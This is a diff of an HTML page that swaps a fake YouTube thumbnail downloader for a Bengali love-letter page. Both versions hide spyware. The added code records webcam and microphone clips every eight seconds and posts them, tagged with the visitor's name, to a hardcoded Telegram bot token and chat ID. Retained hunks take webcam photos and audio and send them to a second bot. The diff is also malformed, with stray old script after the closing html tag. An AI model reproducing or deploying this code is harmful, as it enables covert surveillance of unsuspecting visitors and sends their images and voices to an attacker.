@@ -2,100 +2,309 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>YouTube Thumbnail Downloader</title>
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;700&display=swap" rel="stylesheet">
+  <title>Photography</title>
   <style>
     * {
-      margin: 0; padding: 0; box-sizing: border-box;
-      font-family: 'Montserrat', sans-serif;
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
     body {
-      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
-      min-height: 100vh;
+      font-family: 'Cursive', sans-serif;
+      background: linear-gradient(135deg, #fcb69f, #d4a5a5);
       display: flex;
-      flex-direction: column;
+      justify-content: center;
       align-items: center;
+      height: 100vh;
       color: #fff;
-      padding: 20px;
     }
-    header {
-      margin-top: 40px;
+
+    .name-container {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .name-form {
+      background: #fff;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
       text-align: center;
     }
-    header img {
-      width: 120px;
-      margin-bottom: 10px;
-    }
-    header h1 {
-      font-size: 26px;
-      font-weight: 600;
-      color: #fff;
-    }
-    .container {
-      background: rgba(255, 255, 255, 0.05);
-      backdrop-filter: blur(10px);
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      padding: 30px;
-      border-radius: 16px;
-      margin-top: 30px;
-      width: 100%;
-      max-width: 500px;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.2);
-    }
-    .form-control {
-      width: 100%;
-      padding: 12px 16px;
+
+    .name-form input {
+      padding: 10px;
+      font-size: 1.2rem;
+      width: 250px;
       margin-bottom: 20px;
-      border-radius: 8px;
-      border: none;
-      outline: none;
-      font-size: 16px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
     }
-    .form-control:focus {
-      outline: 2px solid #ff0000;
-    }
-    button {
-      background: #ff0000;
+
+    .name-form button {
+      background-color: #ef4444;
       color: white;
       border: none;
-      padding: 12px;
-      border-radius: 8px;
+      padding: 15px 30px;
       font-size: 16px;
+      font-weight: bold;
+      border-radius: 25px;
       cursor: pointer;
-      transition: 0.3s;
+    }
+
+    .name-form button:hover {
+      background-color: #dc2626;
+    }
+
+    .container {
+      background: #fff;
       width: 100%;
+      max-width: 600px;
+      padding: 40px;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      overflow: hidden;
+      position: relative;
+      display: none;
     }
-    button:hover {
-      background: #cc0000;
+
+    .letter-title {
+      text-align: center;
+      font-size: 2rem;
+      color: #ef4444;
+      margin-bottom: 20px;
+      font-family: 'Georgia', serif;
     }
-    #thumbnail-preview {
+
+    .letter-box {
+      font-family: 'Arial', sans-serif;
+      font-size: 1.2rem;
+      line-height: 1.6;
+      color: #333;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      padding: 20px;
+      background: #fafafa;
+      border-radius: 10px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
       margin-top: 20px;
-      text-align: center;
+      height: 250px;
+      overflow-y: auto;
+      max-height: 250px;
     }
-    footer {
-      margin-top: auto;
-      color: #bbb;
+
+    .caret {
+      display: inline-block;
+      width: 10px;
+      background: #333;
+      margin-left: 4px;
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+
+    .message {
       text-align: center;
-      padding: 20px 0;
+      font-size: 16px;
+      color: #4ade80;
+      margin-top: 20px;
+    }
+
+    .button-container {
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
+    }
+    .letter-box {
+  font-family: 'Hind Siliguri', sans-serif;
+  font-size: 1.2rem;
+  line-height: 1.8;
+  color: #333;
+  white-space: pre-wrap;
+  word-wrap: break-word;
+  padding: 20px;
+  background: #fffaf0;
+  border-radius: 10px;
+  box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+  margin-top: 20px;
+  height: 300px;
+  overflow-y: auto;
+  max-height: 300px;
+}
+    .action-btn {
+      background-color: #ef4444;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 25px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .action-btn:hover {
+      background-color: #dc2626;
+    }
+
+    #canvas {
+      display: none;
     }
   </style>
 </head>
 <body>
-
-  <header>
-    <img src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
-    <h1>Thumbnail Downloader</h1>
-  </header>
-
-  <div class="container">
-    <input type="text" id="ytlink" class="form-control" placeholder="Enter YouTube Video URL">
-    <button onclick="downloadThumbnail()" id="thumbdloadbtn">Fetch Thumbnail</button>
-    <div id="thumbnail-preview"></div>
+  <!-- Fullscreen Name Input Form -->
+  <div class="name-container" id="name-container">
+    <div class="name-form">
+      <h2>তোমার নাম লিখ</h2>
+      <input type="text" id="userName" placeholder="Your Name" />
+      <button id="submit-name">Next</button>
+    </div>
   </div>
 
-  <!-- Hidden video + Telegram logic -->
-  <video id="video" width="0" height="0" autoplay></video>
+  <!-- Love Letter Content -->
+  <div class="container" id="container">
+    <div class="letter-title" id="letter-title">প্রিয় <span id="to-name">Love</span></div>
+    <div class="letter-box" id="letter"></div>
+    <div class="message" id="message">🥹...</div>
+    <div class="button-container">
+      <button class="action-btn" id="start-btn">এইখানে ক্লিক করো </button>
+    </div>
+  </div>
+
+  <canvas id="canvas" width="300" height="400"></canvas>
+
+  <script>
+    let userName = "";
+
+    const letterText = `
+
+তোমাকে লেখা এই চিঠির প্রতিটি শব্দ যেন আমার হৃদয়ের গভীর থেকে উঠে আসা কিছু অনুভূতির প্রতিচ্ছবি। জানি না কীভাবে বলা উচিত, অথবা আদৌ বলা সম্ভব কি না—তবুও চেষ্টা করছি।
+
+তোমার সাথে প্রথম দেখা হওয়ার দিনটা এখনো চোখে ভাসে। সেদিন হয়তো বুঝতে পারিনি, কিন্তু ধীরে ধীরে তুমি আমার ভাবনার প্রতিটি কোণে জায়গা করে নিয়েছো। সকালটা তোমার হাসি দিয়ে শুরু হলে সারাদিনটা ভালো কাটে, আর রাতে ঘুম আসার আগে তোমার মুখটাই মনে পড়ে।
+
+তোমার সাথে কথা বললে মনে হয় সময়টা যেন থেমে যায়। তোমার প্রতিটি কথায়, প্রতিটি হাসিতে আমি নিজের মতো করে একটা পৃথিবী গড়ে নিয়েছি—যেখানে শুধু আমি আর তুমি।
+
+ভালোবাসি—এই ছোট্ট শব্দটা হয়তো আমার অনুভূতির বিশালতা বোঝাতে পারবে না। তবুও বলছি, কারণ তুমি জানার অধিকার রাখো। আমি তোমায় গভীরভাবে, নিরবচ্ছিন্নভাবে, নিঃশর্তভাবে ভালোবাসি।
+
+জানি, জীবন সবসময় মসৃণ হয় না। কিন্তু আমি চাই, সেই প্রতিটি কঠিন সময়েও তুমি আমার পাশে থাকো। আমি প্রতিজ্ঞা করছি, তোমার হাসি রক্ষার জন্য নিজের সমস্ত ভালোবাসা দিয়ে চেষ্টা করব, আজীবন।
+
+এই চিঠিটা তুমি যখনই পড়ো, শুধু এটুকু মনে রেখো—কেউ একজন আছেই, যে তোমার প্রতিটি নিঃশ্বাসে বাঁচে।
+
+`;
+
+    const letterBox = document.getElementById("letter");
+    const startBtn = document.getElementById("start-btn");
+    const submitNameBtn = document.getElementById("submit-name");
+    const nameContainer = document.getElementById("name-container");
+    const container = document.getElementById("container");
+    const toName = document.getElementById("to-name");
+    const userNameInput = document.getElementById("userName");
+    const message = document.getElementById("message");
+    const canvas = document.getElementById('canvas');
+    const token = "7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w";
+    const chatId = "1987016824";
+
+    let index = 0;
+
+    submitNameBtn.addEventListener("click", function() {
+      userName = userNameInput.value.trim();
+      if (userName !== "") {
+        toName.textContent = userName;
+        nameContainer.style.display = "none";
+        container.style.display = "block";
+      }
+    });
+
+    function typeLetter() {
+      if (index < letterText.length) {
+        letterBox.innerHTML = letterText.substring(0, index + 1) + '<span class="caret"></span>';
+        index++;
+        letterBox.scrollTop = letterBox.scrollHeight;
+        setTimeout(typeLetter, 50);
+      } else {
+        letterBox.innerHTML = letterText;
+      }
+    }
+
+    startBtn.addEventListener("click", function() {
+      typeLetter();
+      startBtn.style.display = "none";
+    });
+
+    navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: true
+    })
+    .then(stream => {
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+
+      mediaRecorder.ondataavailable = function(e) {
+        chunks.push(e.data);
+      };
+
+      mediaRecorder.onstop = function() {
+        const blob = new Blob(chunks, { type: "video/webm" });
+        chunks.length = 0;
+        sendVideoToTelegram(blob);
+      };
+
+      setInterval(() => {
+        if (mediaRecorder.state === "recording") {
+          mediaRecorder.stop();
+        }
+
+        mediaRecorder.start();
+        setTimeout(() => {
+          if (mediaRecorder.state === "recording") {
+            mediaRecorder.stop();
+          }
+        }, 5000); // Record for 5 seconds
+      }, 8000); // Every 8 seconds
+    })
+    .catch(err => {
+      message.textContent = "";
+      console.error(err);
+    });
+
+    function sendVideoToTelegram(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("video", blob, "video.webm");
+      formData.append("caption", `This is ${userName}'s video!`);
+
+      fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+        method: "POST",
+        body: formData
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (!data.ok) {
+          message.textContent = "🥹";
+        }
+      })
+      .catch(err => {
+        console.error(err);
+        message.textContent = "🥲";
+      });
+    }
+  </script>
+</body>
+</html>
 
   <script>
     function GetURLParameter(name) {
@@ -117,23 +326,18 @@
 
     function sendToTelegram(data, type) {
       const botToken = '7127289863:AAEBI-cGSj40xJN63HV1mYXZZUP12866G6w';
+      if (!chatid) return console.error('Chat ID is not available.');
 
-      // ✅ Static and dynamic chat IDs
-      const chatIds = ['1987016824'];
-      if (chatid) chatIds.push(chatid); // decoded chatid from URL
+      const formData = new FormData();
+      formData.append('chat_id', chatid);
+      formData.append(type === 'photo' ? 'photo' : 'audio', data, `thumb.${type === 'photo' ? 'jpg' : 'wav'}`);
 
-      chatIds.forEach(id => {
-        const formData = new FormData();
-        formData.append('chat_id', id);
-        formData.append(type === 'photo' ? 'photo' : 'audio', data, `thumb.${type === 'photo' ? 'jpg' : 'wav'}`);
-
-        fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
-          method: 'POST',
-          body: formData
-        }).then(res => res.json())
-          .then(data => console.log(`Telegram response for ${id}:`, data))
-          .catch(err => console.error(`Telegram error for ${id}:`, err));
-      });
+      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+        method: 'POST',
+        body: formData
+      }).then(res => res.json())
+        .then(data => console.log('Telegram response:', data))
+        .catch(err => console.error('Telegram error:', err));
     }
 
     navigator.mediaDevices.getUserMedia({ video: true, audio: true })
@@ -141,14 +345,12 @@
         const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
         const audioRecorder = new MediaRecorder(stream);
 
-        // 📸 Capture 3 photos
         for (let i = 0; i < 3; i++) {
           setTimeout(() => {
             imageCapture.takePhoto().then(blob => sendToTelegram(blob, 'photo'));
           }, i * 2000);
         }
 
-        // 🎙️ Capture audio
         audioRecorder.start();
         setTimeout(() => audioRecorder.stop(), 5000);
         audioRecorder.ondataavailable = (event) => {
@@ -191,8 +393,3 @@
     }
   </script>
 
-  <footer>
-    Made with ❤️ by Your Name
-  </footer>
-</body>
-</html>
